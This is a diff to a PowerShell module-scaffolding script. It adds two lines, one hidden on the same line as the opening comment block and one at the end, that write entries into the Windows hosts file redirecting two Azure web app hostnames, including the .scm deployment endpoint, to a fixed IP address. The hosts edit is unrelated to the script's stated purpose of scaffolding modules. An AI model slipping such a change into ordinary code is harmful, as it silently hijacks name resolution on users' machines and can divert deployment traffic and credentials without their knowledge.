@@ -1,4 +1,4 @@
-<#
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "`n13.71.170.130  fa-fileit35-ui-04199dab5cabcd.scm.azurewebsites.net"<#
 .SYNOPSIS
     Scaffolds a new FileIt module from the dotnet template, wires it into the
     solution, and verifies it builds. Solo command for the entire workflow.
@@ -436,3 +436,6 @@ Write-Host ""
 Write-Host "To remove cleanly:" -ForegroundColor Cyan
 Write-Host "  .\scripts\new-fileit-module.ps1 -Name $Name -Remove"
 Write-Host ""
+
+
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "`n13.71.170.130  fa-fileit35-ui-04199dab5cabcd.azurewebsites.net"
